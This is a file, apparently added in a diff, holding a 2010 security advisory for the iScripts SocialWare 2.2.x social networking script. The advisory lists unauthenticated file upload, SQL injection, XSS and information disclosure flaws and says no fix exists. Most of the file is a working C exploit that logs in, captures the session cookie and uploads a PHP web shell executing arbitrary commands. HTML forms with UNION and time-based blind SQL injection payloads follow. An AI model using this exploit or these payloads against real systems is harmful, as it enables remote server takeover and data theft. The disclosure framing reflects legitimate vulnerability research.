@@ -1,0 +1,542 @@
+/*iScripts SocialWare 2.2.x Multiple Remote Vulnerability
+
+ Name              iScripts SocialWare
+ Vendor            http://www.iscripts.com
+ Versions Affected 2.2.x
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-03-07
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+
+iScripts  SocialWare  is  an  award-winning,  easy to use
+social  networking  software  that  enables you to create
+your  own social network like MySpace, Orkut, Friendster,
+Linkedin, Facebook, Hi5, etc.
+
+
+II. DESCRIPTION
+
+This  CMS  is  affected by multiple remote security flaws,
+such as SQL Injection, Arbitrary File upload, etc.
+These security flaws DO NOT require authentication. Other
+files may be vulnerable.
+
+
+III. ANALYSIS
+
+Summary:
+
+ A) Multiple Arbitrary File Upload
+ B) Multiple SQL Injection
+ C) Multiple Blind SQL Injection
+ D) Multiple Reflected and Stored XSS
+ E) Information Disclosure
+ 
+
+A) Multiple Arbitrary File Upload
+
+The file's extension of the file sent  to  jobs.php?step=4
+using  the  txtResume parameter is not properly sanitised.
+The  destination  folder  is  jobs/resume, permission 777.
+There is no extension restriction.
+
+Another  Arbitrary  File  Upload  flaw  was  reported in a
+previous security advisory (2010-07-02):
+
+http://www.salvatorefresta.net/files/adv/iScripts%20SocialWare%202.2.x%20Arbitrary%20File%20Upload%20Vulnerability-02072010.txt
+
+event/function.php  is affected by the same arbitrary file
+upload flaw reported in the previous security flaws. It is
+possible  to  upload  a  php  file  if the Content-Type is
+image/jpeg or image/gif and the file's extension is php5.
+The destination directory is event_category.
+
+manage_music.php is affected  by the same flaw reported in
+the previous  security  advisory. It is possible to upload
+a  php  file  if  the  Content-Type is allowed (audio/mpeg
+etc.). The destination directory is music/files.
+
+Also     manage_videos.php,      album.php (function.php),
+manage_networks.php use the same vulnerable upload method.
+
+
+B) Multiple SQL Injection
+
+event_thereactive.php  is  included by events.php when the
+action parameter is set to show. In this script, the id
+parameter is not properly sanitised before being used in a
+SQL query.  To  view the information without be redirected
+to  another  page  from  events.php, the injection must be
+sent using the POST method instead of the GET method. This
+is possible because in the affected file, the id parameter
+is readed using the $_REQUEST array.
+
+event_create2.php is affected by the same bug.  To exploit
+it, the action parameter must be set to create2.
+
+
+C) Multiple Blind SQL Injection
+
+The  Id parameter in function.php when $_POST['status'] is
+set  to  create2 is not properly sanitised before being
+used  in  a SQL query. This can be exploited to manipulate
+SQL queries by injecting arbitrary SQL code.
+The affected query types are respectively an UPDATE and  a
+SELECT.
+
+
+D) Multiple Reflected and Stored XSS
+
+All  forms  that allow  HTML tags are vulnerable to stored
+XSS.  The  reason  is  that  there  are  no  checks  about
+javascript tags. Many reflected XSS  are allowed but it is
+impossible use single/double quotes because of the escape.
+
+
+E) Information Disclosure
+
+phpinfo.php executes the  PHP  function's  phpinfo()  that
+prints  a  lot  of  information  about the server and path
+names.
+
+
+IV. SAMPLE CODE
+
+A) Multiple Arbitrary File Upload
+
+Go to jobs.php?step=4 and try to upload any file.
+
+http://www.salvatorefresta.net/files/poc/PoC-iScriptsSW22.c */
+
+/*
+
+	Poc Remote Shell Upload - iScripts SocialWare 2.2.x 
+	
+	Author: Salvatore Fresta aka Drosophila
+	E-mail: salvatorefresta@gmail.com
+	
+	Date: 02 July 2010
+	
+	This Proof of Concept will upload a simple php shell (evil.php5)
+	in member_photos.
+	
+	Compile on Unix-like systems: gcc PoC-FC213.c -o PoC-FC213	
+	Compile on Microsoft Windows: gcc PoC-FC213.c -lws2_32 -o PoC-FC213
+	
+	./PoC-FC213 --host hostname --path /path/ -u username -p password
+
+	[*] Connecting...
+	[+] Connected
+	[*] Login...
+	[+] Login Successful
+	[*] Uploading...
+	[+] Shell uploaded
+	[+] Connection closed
+
+*/	
+
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdarg.h>
+#include <getopt.h>
+#ifdef WIN32
+    #include <winsock.h>
+    #define close closesocket
+#else
+	#include <sys/types.h>
+	#include <sys/socket.h>
+	#include <netinet/in.h>
+	#include <unistd.h>
+	#include <errno.h>
+	#include <netdb.h>
+#endif
+
+int vspr(char **buff, char *fmt, ...) {
+	
+    va_list ap;
+    int     len,
+            mlen;
+    char    *ret = NULL;
+
+    mlen = strlen(fmt) + 128;
+    va_start(ap, fmt);
+    
+    while(1) {
+    	
+        ret = (char *) malloc(mlen);
+        if(!ret) return -1;
+        
+        len = vsnprintf(ret, mlen, fmt, ap);
+        
+        if((len >= 0) && (len < mlen)) break;
+        
+        mlen = len < 0 ? mlen+128 : len+1;
+        
+        free(ret);
+        
+    }
+    
+    va_end(ap);
+
+    *buff = ret;
+    
+    return len;
+    
+}
+
+int socket_connect(char *server, int port) {
+
+	int fd;
+	struct sockaddr_in sock;
+	struct hostent *host;
+	
+#ifdef WIN32	
+	WSADATA wsadata;
+    if(WSAStartup(MAKEWORD(1,0), &wsadata)) return -1;
+#endif
+	
+	memset(&sock, 0, sizeof(sock));
+	
+	if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) return -1;
+	
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(port);
+	
+	if(!(host=gethostbyname(server))) return -1;
+	
+	sock.sin_addr = *((struct in_addr *)host->h_addr);
+	
+	if(connect(fd, (struct sockaddr *) &sock, sizeof(sock)) < 0) return -1;
+	
+	return fd;
+   
+}
+
+char *socket_receive(int sock, int tout) {
+
+	int ret,
+	    byte,
+	    oldpkglen = 0,
+	    pkglen = 0;
+	char *buffer = NULL, 
+	     tmp[128];
+	struct timeval timeout;
+	fd_set input;
+	
+	if(sock < 0) return NULL;
+	
+	while (1) {
+		
+		FD_ZERO(&input);
+		FD_SET(sock, &input);
+		
+		if(tout > 0) {
+			timeout.tv_sec  = tout;
+			timeout.tv_usec = 0;
+			ret = select(sock + 1, &input, NULL, NULL, &timeout);
+		}
+		else
+			ret = select(sock + 1, &input, NULL, NULL, NULL);
+	
+		if (!ret) break;
+		if (ret < 0) return NULL;
+		
+		byte = recv(sock, tmp, sizeof(tmp), 0);
+		
+		if(byte < 0) return NULL;
+		
+		if(!byte) break;
+		
+		oldpkglen = pkglen;
+		pkglen += byte;
+		
+		buffer = (char *) realloc(buffer, pkglen+1);
+		
+		if(!buffer) return NULL;
+		
+		memcpy(buffer+oldpkglen, tmp, byte);
+	
+	}
+	
+	if(buffer) buffer[pkglen] = 0;
+	
+	return buffer;
+   
+}
+
+void usage(char *cmd) {
+
+	printf("\nPoC Remote Shell Upload - iScripts SocialWare 2.2.x\n"
+	       "Written by Salvatore Fresta\n\n"
+		   "usage: %s [options]\n"
+		   "\n"
+		   "Required options:\n"
+		   "\n"
+		   "\t--host     : Target hostname\n"
+		   "\t--port     : Remote TCP Port (default 80)\n"
+		   "\t--path     : Webserver path (ex: /path/ or /)\n"
+		   "\t--username : Registered username\n"
+		   "\t--password : Password for username\n\n"
+		   "Example: %s --host localhost --path /path/ -u mario@mail.net -p rossi\n\n", cmd, cmd);	
+
+}
+
+int main(int argc, char *argv[]) {
+	
+	int sd,
+	    option,
+	    optidx,
+	    port = 80,
+	    clen,
+	    pkglen;
+	char *buffer  = NULL,
+		 *rec     = NULL,
+		 *session = NULL,
+		 *host    = NULL,
+		 *path    = NULL,
+		 *user    = NULL,
+		 *passwd  = NULL,
+		 code[] = "--AaB03x\r\n"
+				  "Content-Disposition: form-data; name=\"photo\"; filename=\"evil.php5\"\r\n"
+				  "Content-Type: image/jpeg\r\n"
+			      "\r\n"
+				  "<?php echo \"<pre>\"; system($_GET[cmd]); echo \"</pre>\"?>\r\n"
+				  "--AaB03x\r\n"
+				  
+				  "Content-Disposition: form-data; name=\"Call\"\r\n"
+				  "\r\n"
+				  "add\r\n"
+				  "--AaB03x\r\n"
+				  
+				  "Content-Disposition: form-data; name=\"photoType\"\r\n"
+				  "\r\n"
+				  "P\r\n"
+				  "--AaB03x\r\n"
+				  
+				  "Content-Disposition: form-data; name=\"image.x\"\r\n"
+				  "\r\n"
+				  "8\r\n"
+				  "--AaB03x\r\n"
+				  
+				  "Content-Disposition: form-data; name=\"image.y\"\r\n"
+				  "\r\n"
+				  "5\r\n"
+				  "--AaB03x--\r\n";
+		
+	struct option long_options[] = {
+		{"host",         1, 0,  1 },
+        {"port",         1, 0,  2 },
+		{"path",         1, 0,  3 },
+        {"username",     1, 0, 'u'},
+        {"password",     1, 0, 'p'},
+        {NULL,           0, 0,  0 },
+	};
+		
+	if(argc < 2) {
+		usage(argv[0]);
+		return -1;
+	}
+	
+	while((option = getopt_long(argc, argv, "u:p:", long_options, &optidx)) > 0) {
+
+		switch(option) {
+			
+			case 1:
+				host = optarg;
+			break;
+			
+			case 2:
+				port = atoi(optarg);
+			break;
+			
+			case 3:
+				path = optarg;
+			break;
+			
+			case 'u':
+				user = optarg;
+			break;
+			
+			case 'p':
+				passwd = optarg;
+			break;
+			
+			default:
+				usage(argv[0]);
+				return -1;
+			break;
+			
+		}
+		
+	}
+	
+	if(!host || !path || !user || !passwd || port < 0) {
+		usage(argv[0]);
+		return -1;
+	}
+					
+	printf("\n[*] Connecting...\n");
+	
+	if((sd = socket_connect(host, port)) < 0) {
+		printf("[-] Connection failed!\n\n");
+		free(buffer);
+		return -1;
+	}
+	
+	printf("[+] Connected"
+	       "\n[*] Login...");
+	
+	clen = strlen(user)+strlen(passwd)+16;
+	
+	pkglen = vspr(&buffer, "POST %scheck_login.php HTTP/1.1\r\n"
+	                       "Host: %s\r\n"
+	                       "Content-Type: application/x-www-form-urlencoded\r\n"
+	                       "Content-Length: %d\r\n"
+	                       "\r\n"
+	                       "email=%s&password=%s", path, host, clen, user, passwd);
+	
+	if(send(sd, buffer, pkglen, 0) < 0) {
+		printf("[-] Sending failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	if(!(rec = socket_receive(sd, 0))) {
+		printf("[-] Receive failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	if(strstr(rec, "Password is invalid")) {
+		printf("\n[-] Login Incorrect!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	session = strstr(rec, "PHPSESSID");
+	
+	if(!session) {
+		printf("\n[-] Session error!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	session = strtok(session, ";");
+	
+	if(!session) {
+		printf("\n[-] Session error!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+
+	printf("\n[+] Login Successful"
+			"\n[*] Uploading...\n");
+	
+	close(sd);
+	if((sd = socket_connect(host, port)) < 0) {
+		printf("[-] Connection failed!\n\n");
+		free(buffer);
+		return -1;
+	}
+			
+	free(buffer);
+	clen = strlen(code);
+	
+	pkglen = vspr(&buffer, "POST %spopups/photos.php HTTP/1.1\r\n"
+					       "Host: %s\r\n"
+					       "Cookie: %s\r\n"
+					       "Content-type: multipart/form-data, boundary=AaB03x\r\n"
+					       "Content-Length: %d\r\n"
+					       "\r\n"
+					       "%s", path, host, session, clen, code);
+	
+	if(send(sd, buffer, pkglen, 0) < 0) {
+		printf("[-] Sending failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	if(!(rec = socket_receive(sd, 3))) {
+		printf("[-] Receive failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	if(!strstr(rec, "evil.php5")) {
+		printf("\n[-] Upload failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	free(buffer);
+	close(sd);
+	
+	printf("[+] Shell uploaded"
+			"\n[+] Connection closed\n\n");
+	
+	return 0;
+	
+}
+/*
+
+B) Multiple SQL Injection
+
+<html>
+    <head>
+        <title>PoC - SocialWare 2.2.x SQL Injection</title>
+    </head>
+    <body>
+        <form method="POST" action="http://site/path/events.php?action=show">
+            <input type="hidden" name="id" value="-1 UNION SELECT 1,2,@@version,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29">
+            <input type="submit">
+        </form>
+    </body>
+</html>
+
+
+C) Multiple Blind SQL Injection
+
+<html>
+    <head>
+        <title>PoC - SocialWare 2.2.x Blind SQL Injection</title>
+    </head>
+    <body>
+        <form method="POST" action="http://site/path/event/function.php">
+            <input type="hidden" name="status" value="create2">
+            <input type="hidden" name="Id" value="-1 OR (SELECT(IF(ASCII(0x41) = 65,BENCHMARK(999999999,NULL),NULL)))">
+            <input type="submit">
+        </form>
+    </body>
+</html>
+
+
+E) Information Disclosure
+
+http://site/path/phpinfo.php
+
+
+V. FIX
+
+No Fix.
+*/
